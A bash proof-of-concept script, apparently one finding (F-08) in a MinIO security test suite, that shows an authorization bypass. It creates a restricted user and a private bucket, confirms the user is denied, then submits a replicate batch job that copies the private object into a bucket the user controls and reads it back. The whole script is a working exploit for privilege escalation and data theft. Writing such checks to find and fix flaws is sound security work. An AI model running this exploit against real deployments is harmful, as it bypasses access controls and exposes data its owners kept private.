#!/usr/bin/env bash
# F-08 — admin:StartBatchJob exfiltrates ANY bucket (batch job reads with server authority,
# not the submitter's policy).
# Prereq: setup/01-single-node.sh
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"
T=${1:-$S1}; HOST=${T#*//}

echo "=== setup: private source bucket + a batch user that CANNOT read it ==="
mcsh '
mc alias set L '"$T"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
mc mb -p L/secret-bkt >/dev/null 2>&1; printf "TOP-SECRET-BATCH-EXFIL\n" | mc pipe L/secret-bkt/private.txt >/dev/null 2>&1
mc mb -p L/exfil-bkt >/dev/null 2>&1
cat > /tmp/batch.json <<POL
{"Version":"2012-10-17","Statement":[
 {"Effect":"Allow","Action":["admin:StartBatchJob","admin:ListBatchJobs","admin:DescribeBatchJob"],"Resource":["arn:aws:s3:::*"]},
 {"Effect":"Allow","Action":["s3:*"],"Resource":["arn:aws:s3:::exfil-bkt","arn:aws:s3:::exfil-bkt/*"]}]}
POL
mc admin policy create L batch-pol /tmp/batch.json >/dev/null 2>&1
mc admin user add L batchuser batchpass12345 >/dev/null 2>&1
mc admin policy attach L batch-pol --user batchuser >/dev/null 2>&1
mc alias set BU '"$T"' batchuser batchpass12345 >/dev/null 2>&1
printf "  [control] batchuser reads secret-bkt : "; mc cat BU/secret-bkt/private.txt 2>&1 | tail -1
echo "=== ATTACK: batchuser submits a replicate job source=secret-bkt -> target=exfil-bkt ==="
cat > /tmp/job.yaml <<YAML
replicate:
  apiVersion: v1
  source:
    type: minio
    bucket: secret-bkt
    prefix: ""
  target:
    type: minio
    bucket: exfil-bkt
    endpoint: "'"$T"'"
    path: "on"
    credentials:
      accessKey: batchuser
      secretKey: batchpass12345
YAML
mc batch start BU /tmp/job.yaml 2>&1 | tail -1
sleep 6
printf "  [result] exfil-bkt/private.txt content : "; mc cat BU/exfil-bkt/private.txt 2>&1 | tail -1
'
echo
echo "VULNERABLE if: control='Insufficient permissions' but the batch job exfiltrated the object anyway."
